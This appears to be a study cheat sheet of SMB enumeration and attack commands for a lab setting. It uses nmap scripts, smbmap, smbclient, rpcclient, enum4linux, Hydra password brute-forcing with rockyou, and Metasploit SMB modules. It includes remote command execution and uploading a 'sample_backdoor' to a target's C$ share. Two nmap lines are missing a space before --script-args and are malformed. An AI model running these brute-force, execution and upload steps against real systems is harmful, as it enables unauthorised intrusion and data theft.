### NMAP
```bash
sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -sU --top-ports 25 --open <TARGET_IP>

nmap -p 445 --script smb-protocols <TARGET_IP>
nmap -p 445 --script smb-security-mode <TARGET_IP>

nmap -p 445 --script smb-enum-sessions <TARGET_IP>
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares <TARGET_IP>
nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-os-discovery <TARGET_IP>

nmblookup -A <TARGET_IP>
```

### SMBMAP
```bash
smbmap -u guest -p "" -d . -H <TARGET_IP>

smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>

## Run a command
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'
## List all drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L
## List dir content
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'
## Upload a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor'
## Download a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
```

### SMB Connection
```bash
smbclient -L <TARGET_IP> -N
smbclient -L <TARGET_IP> -U <USER>
smbclient //<TARGET_IP>/<USER> -U <USER>
smbclient //<TARGET_IP>/admin -U admin
smbclient //<TARGET_IP>/public -N
## SMBCLIENT
help
ls
get <filename>

rpcclient -U "" -N <TARGET_IP>
## RPCCLIENT
enumdomusers
enumdomgroups
lookupnames admin
```

### ENUM4LINUX
```bash
enum4linux -o <TARGET_IP>
enum4linux -U <TARGET_IP>
enum4linux -S <TARGET_IP>
enum4linux -G <TARGET_IP>
enum4linux -i <TARGET_IP>
enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
```

### HYDRA
```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz

hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
```

### METASPLOIT
```bash
msfconsole
msfconsole -q

# METASPLOIT SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/pipe_auditor

## set options depends on the selected module
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser <USER>
set RHOSTS <TARGET_IP>
exploit
```

